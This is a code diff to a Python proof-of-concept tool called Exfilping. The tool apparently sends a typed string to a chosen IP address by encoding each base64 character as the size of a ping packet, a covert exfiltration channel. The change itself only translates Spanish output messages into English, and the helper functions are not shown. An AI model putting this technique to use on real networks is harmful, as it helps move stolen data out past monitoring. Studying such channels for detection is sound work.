@@ -23,7 +23,7 @@ def realizar_ping(direccion_ip, tamano):
     return resultado
 
 def main():
-    print("Exfilping v. 0.1 - Prueba de concepto - github.com/disketteomelette")
+    print("Exfilping v. 0.1 - Proof of Concept - github.com/disketteomelette")
     cadena = input("Ingrese la cadena a enviar: ")
     direccion_ip = input("Ingrese la dirección IP a la que enviar el mensaje: ")
     diccionario_base64 = generar_diccionario_base64()
@@ -34,8 +34,9 @@ def main():
             numero = diccionario_base64[caracter]
             print(f"{caracter}: {numero}")
             resultado_ping = realizar_ping(direccion_ip, numero)
-            print(f"Resultado del ping para el carácter '{caracter}': {resultado_ping}")
-    print("Fin")
+            print(f"Ping result for character '{caracter}': {resultado_ping}")
+    print("End")
 
 if __name__ == "__main__":
     main()
+
